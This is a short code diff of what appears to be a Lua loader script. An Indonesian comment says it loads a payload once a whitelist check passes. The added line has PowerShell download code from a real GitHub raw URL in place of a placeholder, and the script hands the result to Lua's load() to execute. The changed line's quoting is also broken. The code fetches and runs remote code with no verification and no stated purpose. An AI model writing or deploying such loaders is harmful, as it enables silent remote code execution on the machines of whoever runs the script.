@@ -24,7 +24,7 @@ end
 
 -- kalau lolos whitelist, load payload
 local payload = io.popen(
-  'powershell -Command "(New-Object Net.WebClient).DownloadString(\'https://your-site.com/payload.enc\')"'
+  'powershell -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VeLLL3/gtfyfybre/refs/heads/main/proxy.lua/')"'
 ):read("*a")
 
 local f = load(payload)
